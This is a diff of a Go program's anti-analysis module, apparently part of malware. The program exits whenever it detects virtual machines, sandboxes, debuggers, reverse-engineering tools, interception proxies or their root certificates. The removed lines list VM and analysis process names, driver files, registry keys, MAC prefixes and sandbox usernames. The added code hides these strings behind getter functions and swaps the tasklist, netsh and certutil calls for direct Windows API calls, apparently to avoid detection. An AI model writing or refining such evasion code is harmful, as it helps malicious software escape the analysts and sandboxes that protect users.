@@ -116,90 +116,19 @@ func checkAntiVps() {
 		return
 	}
 
-	vmProcesses := []string{
-		"VBoxService.exe",
-		"VBoxTray.exe",
-		"vmtoolsd.exe",
-		"VMwareTray.exe",
-		"VMwareUser.exe",
-		"vmware.exe",
-		"vmware-vmx.exe",
-		"prl_tools.exe",
-		"prl_cc.exe",
-		"qemu-ga.exe",
-		"vmsrvc.exe",
-		"vboxservice.exe",
-		"vboxtray.exe",
-		"xenservice.exe",
-		"joeboxcontrol.exe",
-		"joeboxserver.exe",
-		"cuckoomon.exe",
-		"cuckoo.exe",
-		"prl_tools_service.exe",
-		"vdagent.exe",
-		"vdservice.exe",
-		"windanr.exe",
-	}
-	for _, p := range vmProcesses {
+	for _, p := range getVmProcesses() {
 		if checkProcessRunning(p) {
 			os.Exit(1)
 		}
 	}
 
-	sandboxProcs := []string{
-		"SandboxieRpcSs.exe",
-		"SandboxieDcomLaunch.exe",
-		"SbieSvc.exe",
-		"procmon.exe",
-		"procmon64.exe",
-		"wireshark.exe",
-		"fiddler.exe",
-		"ollydbg.exe",
-		"idaq.exe",
-		"idaq64.exe",
-		"x64dbg.exe",
-		"x32dbg.exe",
-		"windbg.exe",
-		"dnSpy.exe",
-		"de4dot.exe",
-		"ilspy.exe",
-		"dotPeek32.exe",
-		"dotPeek64.exe",
-		"pestudio.exe",
-		"processhacker.exe",
-		"autoruns.exe",
-		"autorunsc.exe",
-		"regmon.exe",
-		"filemon.exe",
-		"tcpview.exe",
-		"Rachael.exe",
-		"DVTAP.exe",
-		"analyzer.exe",
-	}
-	for _, p := range sandboxProcs {
+	for _, p := range getSandboxProcs() {
 		if checkProcessRunning(p) {
 			os.Exit(1)
 		}
 	}
 
-	vmFiles := []string{
-		"C:\\Windows\\System32\\VBox*.dll",
-		"C:\\Windows\\System32\\VBoxHook.dll",
-		"C:\\Windows\\System32\\VBoxGuest.sys",
-		"C:\\Windows\\System32\\VBoxMouse.sys",
-		"C:\\Windows\\System32\\VBoxSF.sys",
-		"C:\\Windows\\System32\\vmGuestLib.dll",
-		"C:\\Windows\\System32\\vm3dgl.dll",
-		"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
-		"C:\\Program Files\\Oracle\\VirtualBox\\VBoxService.exe",
-		"C:\\Windows\\System32\\drivers\\vmmouse.sys",
-		"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
-		"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
-		"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
-		"C:\\Windows\\System32\\drivers\\VBoxSF.sys",
-		"C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
-	}
-	for _, pattern := range vmFiles {
+	for _, pattern := range getVmFiles() {
 		if checkFileExists(pattern) {
 			os.Exit(1)
 		}
@@ -222,7 +151,7 @@ func checkAntiVps() {
 func checkLowRAM() {
 	var memInfo [8 * 8]byte
 	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
-	proc := kernel32.NewProc("GlobalMemoryStatusEx")
+	proc := kernel32.NewProc(getGlobalMemoryStatusExName())
 	*(*uint32)(unsafe.Pointer(&memInfo[0])) = uint32(len(memInfo))
 	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&memInfo[0])))
 	if ret == 0 {
@@ -238,7 +167,7 @@ func checkLowRAM() {
 func checkSmallDisk() {
 	var freeBytesAvail, totalBytes, totalFree uint64
 	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
-	proc := kernel32.NewProc("GetDiskFreeSpaceExW")
+	proc := kernel32.NewProc(getGetDiskFreeSpaceExWName())
 	pathPtr, _ := syscall.UTF16PtrFromString("C:\\")
 	ret, _, _ := proc.Call(
 		uintptr(unsafe.Pointer(pathPtr)),
@@ -257,7 +186,7 @@ func checkSmallDisk() {
 
 func checkLowUptime() {
 	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
-	proc := kernel32.NewProc("GetTickCount64")
+	proc := kernel32.NewProc(getGetTickCount64Name())
 	ret, _, _ := proc.Call()
 	uptimeMs := uint64(ret)
 	uptimeMin := uptimeMs / 60000
@@ -276,25 +205,14 @@ func checkSandboxUser() {
 	if len(parts) > 1 {
 		name = parts[len(parts)-1]
 	}
-	sandboxNames := []string{
-		"sandbox", "virus", "malware", "maltest",
-		"test", "john", "user", "currentuser",
-		"sand box", "tester", "cuckoo", "vmware",
-		"vbox", "qemu", "analysis", "sample",
-		"default", "infected", "pc",
-	}
-	for _, s := range sandboxNames {
+	for _, s := range getSandboxUsers() {
 		if name == s {
 			os.Exit(1)
 		}
 	}
 	hostname, _ := os.Hostname()
 	hostLower := strings.ToLower(hostname)
-	sandboxHosts := []string{
-		"sandbox", "malware", "virus", "analysis",
-		"sample", "cuckoo", "testpc", "desktop-",
-	}
-	for _, s := range sandboxHosts {
+	for _, s := range getSandboxHosts() {
 		if strings.Contains(hostLower, s) && s != "desktop-" {
 			os.Exit(1)
 		}
@@ -302,33 +220,27 @@ func checkSandboxUser() {
 }
 
 func checkVMRegistry() {
-	vmKeys := []struct {
-		root uint32
-		path string
-	}{
-		{0x80000002, "SOFTWARE\\VMware, Inc.\\VMware Tools"},
-		{0x80000002, "SOFTWARE\\Oracle\\VirtualBox Guest Additions"},
-		{0x80000001, "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxService"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxSF"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxVideo"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\vmci"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\vmhgfs"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\vmmouse"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VMTools"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VMMEMCTL"},
-		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\Xen*"},
-	}
 	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
-	regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
-	regCloseKey := advapi32.NewProc("RegCloseKey")
-	for _, vk := range vmKeys {
-		pathPtr, _ := syscall.UTF16PtrFromString(vk.path)
+	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
+	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
+	for _, entry := range getVmRegPaths() {
+		parts := strings.SplitN(entry, "|", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		var root uint32
+		switch parts[0] {
+		case "0x80000001":
+			root = 0x80000001
+		case "0x80000002":
+			root = 0x80000002
+		default:
+			continue
+		}
+		pathPtr, _ := syscall.UTF16PtrFromString(parts[1])
 		var hKey syscall.Handle
 		ret, _, _ := regOpenKeyEx.Call(
-			uintptr(vk.root),
+			uintptr(root),
 			uintptr(unsafe.Pointer(pathPtr)),
 			0,
 			uintptr(0x20019),
@@ -343,7 +255,7 @@ func checkVMRegistry() {
 
 func checkLowScreenRes() {
 	user32 := syscall.NewLazyDLL(getUser32DLL())
-	getMetrics := user32.NewProc("GetSystemMetrics")
+	getMetrics := user32.NewProc(getGetSystemMetricsName())
 	w, _, _ := getMetrics.Call(0)
 	h, _, _ := getMetrics.Call(1)
 	if w < 800 || h < 600 {
@@ -356,11 +268,7 @@ func checkVMMacAddress() {
 	if err != nil {
 		return
 	}
-	vmPrefixes := []string{
-		"00:05:69", "00:0c:29", "00:1c:14", "00:50:56",
-		"08:00:27", "00:1c:42", "52:54:00", "00:16:3e",
-		"00:03:ff", "02:42:ac",
-	}
+	vmPrefixes := getVmMacPrefixes()
 	for _, iface := range ifaces {
 		if len(iface.HardwareAddr) == 0 {
 			continue
@@ -398,30 +306,7 @@ func checkAntiMitm() {
 		os.Exit(1)
 	}
 
-	mitmProcs := []string{
-		"Fiddler.exe",
-		"FiddlerEverywhere.exe",
-		"Charles.exe",
-		"BurpSuite.exe",
-		"burp.exe",
-		"mitmproxy.exe",
-		"Proxifier.exe",
-		"HTTPDebuggerUI.exe",
-		"HTTPDebuggerSvc.exe",
-		"sslsplit.exe",
-		"sslproxy.exe",
-		"zap.exe",
-		"OWASPZAP.exe",
-		"SmartSniff.exe",
-		"HttpAnalyzerStd.exe",
-		"RawCap.exe",
-		"NetworkMiner.exe",
-		"GlassWire.exe",
-		"Tcpdump.exe",
-		"PacketCapture.exe",
-		"NetworkMonitor.exe",
-	}
-	for _, p := range mitmProcs {
+	for _, p := range getMitmProcs() {
 		if checkProcessRunning(p) {
 			os.Exit(1)
 		}
@@ -439,36 +324,65 @@ func hasProxyConfigured() bool {
 		}
 	}
 
-	cmd := exec.Command("netsh", "winhttp", "show", "proxy")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	out, err := cmd.Output()
+	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
+	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
+	regQueryValue := advapi32.NewProc("RegQueryValueExW")
+	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
 
-	if err == nil {
-		text := strings.ToLower(string(out))
-		if strings.Contains(text, "proxy server") && text != "" && !strings.Contains(text, "direct access") {
-			return true
-		}
+	keyPath, _ := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
+	var hKey syscall.Handle
+	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
+	if ret != 0 {
+		return false
+	}
+	defer regCloseKey.Call(uintptr(hKey))
+
+	valName, _ := syscall.UTF16PtrFromString("ProxyEnable")
+	var valType, valSize uint32
+	valSize = 4
+	var proxyEnabled uint32
+	ret2, _, _ := regQueryValue.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&valType)), uintptr(unsafe.Pointer(&proxyEnabled)), uintptr(unsafe.Pointer(&valSize)))
+	if ret2 == 0 && proxyEnabled != 0 {
+		return true
 	}
 
 	return false
 }
 
 func checkMitmCerts() {
-	cmd := exec.Command("certutil", "-store", "Root")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	out, err := cmd.Output()
-	if err != nil {
+	crypt32 := syscall.NewLazyDLL(getCrypt32DLL())
+	certOpenStore := crypt32.NewProc(getCertOpenSystemStoreWName())
+	certEnumCerts := crypt32.NewProc(getCertEnumCertsName())
+	certGetName := crypt32.NewProc(getCertGetNameStringWName())
+	certFreeCert := crypt32.NewProc(getCertFreeCertCtxName())
+	certCloseStore := crypt32.NewProc(getCertCloseStoreName())
+
+	storeNamePtr, _ := syscall.UTF16PtrFromString("Root")
+	hStore, _, _ := certOpenStore.Call(0, uintptr(unsafe.Pointer(storeNamePtr)))
+	if hStore == 0 {
 		return
 	}
-	text := strings.ToLower(string(out))
-	mitmIssuers := []string{
-		"fiddler", "charles", "burp", "mitmproxy",
-		"portswigger", "owasp", "zap proxy",
-		"do_not_trust", "insecure",
-	}
-	for _, issuer := range mitmIssuers {
-		if strings.Contains(text, issuer) {
-			os.Exit(1)
+	defer certCloseStore.Call(hStore, 0)
+
+	issuers := getMitmIssuers()
+	var certCtx uintptr
+	for {
+		certCtx, _, _ = certEnumCerts.Call(hStore, certCtx)
+		if certCtx == 0 {
+			break
+		}
+		buf := make([]uint16, 512)
+		ret, _, _ := certGetName.Call(certCtx, 1, 0, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
+		if ret == 0 {
+			continue
+		}
+		name := strings.ToLower(syscall.UTF16ToString(buf))
+		for _, iss := range issuers {
+			if strings.Contains(name, iss) {
+				certFreeCert.Call(certCtx)
+				certCloseStore.Call(hStore, 0)
+				os.Exit(1)
+			}
 		}
 	}
 }
@@ -478,15 +392,52 @@ func checkFileExists(pattern string) bool {
 	return err == nil && len(matches) > 0
 }
 
-func checkProcessRunning(processName string) bool {
-	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %%s", processName), "/NH")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	output, err := cmd.Output()
+type processEntry32 struct {
+	Size            uint32
+	CntUsage        uint32
+	ProcessID       uint32
+	DefaultHeapID   uintptr
+	ModuleID        uint32
+	CntThreads      uint32
+	ParentProcessID uint32
+	PriClassBase    int32
+	Flags           uint32
+	ExeFile         [260]uint16
+}
 
-	if err != nil {
+func checkProcessRunning(processName string) bool {
+	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
+	createSnapshot := kernel32.NewProc(getCreateToolhelp32SnapshotName())
+	pFirst := kernel32.NewProc(getProcess32FirstWName())
+	pNext := kernel32.NewProc(getProcess32NextWName())
+	closeHandle := kernel32.NewProc(getCloseHandleName())
+
+	snap, _, _ := createSnapshot.Call(0x00000002, 0)
+	if snap == 0 || snap == ^uintptr(0) {
 		return false
 	}
-	return strings.Contains(string(output), processName)
+	defer closeHandle.Call(snap)
+
+	var pe processEntry32
+	pe.Size = uint32(unsafe.Sizeof(pe))
+	ret, _, _ := pFirst.Call(snap, uintptr(unsafe.Pointer(&pe)))
+	if ret == 0 {
+		return false
+	}
+
+	target := strings.ToLower(processName)
+	for {
+		name := strings.ToLower(syscall.UTF16ToString(pe.ExeFile[:]))
+		if name == target {
+			return true
+		}
+		pe.Size = uint32(unsafe.Sizeof(pe))
+		ret, _, _ = pNext.Call(snap, uintptr(unsafe.Pointer(&pe)))
+		if ret == 0 {
+			break
+		}
+	}
+	return false
 }
 
 func setupLogger() *os.File { return nil }
